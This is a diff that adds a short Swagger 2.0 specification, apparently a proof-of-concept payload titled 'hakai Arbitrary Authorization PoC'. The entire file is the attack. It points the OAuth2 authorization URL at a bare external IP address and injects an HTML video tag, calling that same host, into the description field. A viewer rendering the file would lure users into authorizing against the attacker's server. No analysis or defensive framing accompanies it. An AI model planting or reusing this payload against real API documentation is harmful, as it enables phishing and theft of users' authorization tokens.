@@ -1,0 +1,15 @@
+swagger: '2.0'
+securityDefinitions:
+  a:
+    type: oauth2
+    authorizationUrl: http://158.220.94.15:8000/authorization
+info:
+  version: "0.0.1"
+  title: hakai Arbitrary Authorization PoC
+  description: Please Authorize!<video src="http://158.220.94.15:8000/authorization">
+paths:
+  /:
+    get:
+      responses:
+        200:
+          description: Successful response
